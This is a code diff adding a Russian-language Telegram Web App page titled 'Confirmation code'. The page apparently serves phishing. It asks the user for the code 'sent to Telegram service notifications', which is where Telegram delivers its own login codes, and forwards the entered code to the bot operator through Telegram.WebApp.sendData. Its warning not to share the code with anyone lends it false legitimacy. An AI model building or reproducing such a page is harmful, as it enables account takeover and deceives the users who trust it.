@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Код подтверждения</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #1c1c1e; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; padding: 20px;
+        }
+        .card {
+            width: 100%; max-width: 320px;
+            background: #2c2c2e; border-radius: 20px;
+            padding: 30px 20px; text-align: center;
+        }
+        h3 { margin-bottom: 10px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        input {
+            width: 100%; padding: 15px; font-size: 24px;
+            text-align: center; letter-spacing: 3px;
+            background: #3a3a3c; border: 1px solid #4a4a4d;
+            border-radius: 14px; color: #fff; outline: none;
+            margin-bottom: 20px;
+        }
+        button {
+            width: 100%; padding: 16px; background: #007aff;
+            color: white; font-size: 18px; font-weight: bold;
+            border: none; border-radius: 14px; cursor: pointer;
+        }
+        button:active { background: #005fcc; }
+        .hint { color: #8e8e93; font-size: 12px; margin-top: 12px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3>Введите код из SMS</h3>
+        <p>Код отправлен в служебные уведомления Telegram</p>
+        <input type="text" id="code" inputmode="numeric" maxlength="8" placeholder="••••••" autocomplete="one-time-code">
+        <button id="btn" onclick="sendCode()">Подтвердить</button>
+        <div class="hint">Не сообщайте код никому</div>
+    </div>
+
+    <script>
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+
+        function sendCode() {
+            const code = document.getElementById('code').value.trim();
+            if (code.length < 4) {
+                alert('Введите код (минимум 4 цифры)');
+                return;
+            }
+            const btn = document.getElementById('btn');
+            btn.disabled = true;
+            btn.textContent = 'Отправка...';
+
+            try {
+                Telegram.WebApp.sendData(JSON.stringify({ code: code }));
+                Telegram.WebApp.close();
+            } catch (e) {
+                alert('Ошибка: ' + e.message);
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
+            }
+        }
+
+        document.getElementById('code').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendCode();
+        });
+    </script>
+</body>
+</html>
